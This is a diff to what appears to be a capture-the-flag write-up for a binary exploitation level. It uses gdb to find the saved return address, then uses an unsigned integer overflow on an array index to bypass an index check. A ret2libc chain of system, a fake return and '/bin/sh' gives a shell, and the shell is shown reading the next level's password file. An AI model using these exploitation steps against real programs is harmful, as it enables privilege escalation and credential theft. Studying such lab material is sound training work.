@@ -160,29 +160,79 @@ b *main+455  // store
 b *main+520  // read
 
 where the array_ptr is located when value retrieval
+```
 <read_number+40>:	add    0x8(%ebp),%eax
 (gdb) x/x $ebp+8
 0xffffd500:	0xffffd524 <==
 
 0xffffd524 + 7*4 = 0xffffd540
 p *(int *)0xffffd540 = 123
-
+```
 find main eip
-
+```
 info frame
 eip at 0xffffd6ec
 
 (gdb) p/d 0xffffd6ec - 0xffffd524 = 456 / 4 = 114
 
 114 / 3 = 38
-
+```
 so this index cannot be inserted directly to the program
 
-we will go for Integer overflow attack since the index is stored by scanf as %u
 
+we will go for Integer overflow attack since the index is stored by scanf as %u
+```
 114 in binary
 printf %032d 1110010
 00000000000000000000000001110010
 since the index is `shl by $0x2` will get rid of the 2 MSB
-11000000000000000000000001110010 = -1073741710
+10000000000000000000000001110010 = 2147483762
+```
+```
+(gdb) find 0xf7e2c000 , 0xf7fcc000 , "/bin/sh"
+0xf7f897ec
+
+      114               115                116
+  2147483762            115                116  
+[   &system  ] + [ &ret_of_system ] + [  &bin_sh   ]
+[ 0xf7e6aed0 ] + [      aaaa      ] + [ 0xf7f897ec ]
+[ 4159090384 ] + [   1633771873   ] + [ 4160264172 ]
+
+
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ 
+Input command: store
+ Number: 1633771873
+ Index: 115
+ 
+Input command: store
+ Number: 4160264172
+ Index: 116
+
+Input command: quit
+
+$ pwd
+/home/users/level07
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
+
+we could skip 115 the return of system, garbage value
+```
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+
+Input command: store
+ Number: 4160264172
+ Index: 116
+
+Input command: quit
+$ pwd
+/home/users/level07
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
 
